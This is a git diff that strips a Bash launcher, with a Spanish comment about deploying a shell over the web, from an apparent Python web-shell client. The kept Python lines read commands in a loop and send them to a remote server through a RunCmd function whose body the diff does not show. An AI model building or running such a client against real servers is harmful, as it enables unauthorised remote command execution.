@@ -1,25 +1,3 @@
-#!/bin/bash
-: ' 
-	crear una plataforma de despliegue de shell sobre la web
-'
-# colors
-green=32; red=31; blue=34; yellow=33; purple=35; cian=36; gray=37
-function color()
-{
-	colorcode="$1"
-	echo -e "\e[3;${colorcode};40m ${@:2} \e[m"
-}
-
-# exit
-trap ctrl_c INT
-function ctrl_c()
-{
-	color "$red" 'Saliendo... [!]'
-}
-
-function pythonscript()
-{
-cat << 'SCRIPT'
 #!/usr/bin/python3
 import requests, sys, signal, time
 from base64 import b64encode
@@ -39,8 +17,3 @@ while True:
 	cmd = input("$~ ")
 	response = RunCmd(cmd)
 	print(response)
-SCRIPT
-}
-
-
-(pythonscript > webshell.py; chmod +x webshell.py; ./webshell.py)
